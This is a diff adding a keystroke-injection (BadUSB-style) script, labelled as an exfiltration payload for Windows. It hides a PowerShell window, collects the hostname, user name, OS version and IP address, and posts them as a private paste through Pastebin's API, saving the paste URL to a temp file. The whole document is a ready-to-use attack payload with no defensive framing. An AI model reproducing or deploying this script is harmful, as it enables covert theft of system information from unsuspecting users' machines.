@@ -1,0 +1,27 @@
+REM Author: UNC0V3R3D
+REM Description: Collects system info and posts it to Pastebin via the API.
+REM Version: 1.0
+REM Category: Exfiltration
+REM Target: Windows 10/11
+REM Requirements: Internet connection, Pastebin API key
+DELAY 1000
+GUI r
+DELAY 700
+STRING powershell -windowstyle hidden
+ENTER
+DELAY 1500
+STRING $info = "Hostname=$env:COMPUTERNAME User=$env:USERNAME OS=" + (Get-WmiObject Win32_OperatingSystem).Caption + " IP=" + ((Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notmatch '^(127|169)'} | Select-Object -First 1).IPAddress)
+ENTER
+DELAY 400
+STRING $apiKey = 'PASTEBIN_API_KEY'
+ENTER
+STRING $body = "api_dev_key=$apiKey&api_option=paste&api_paste_code=" + [Uri]::EscapeDataString($info) + "&api_paste_name=report&api_paste_expire_date=1D&api_paste_private=1"
+ENTER
+STRING $url = Invoke-RestMethod -Uri 'https://pastebin.com/api/api_post.php' -Method Post -Body $body -ContentType 'application/x-www-form-urlencoded'
+ENTER
+STRING $url | Out-File "$env:TEMP\pb_url.txt" -Force
+ENTER
+DELAY 3000
+STRING exit
+ENTER
+REM End of payload
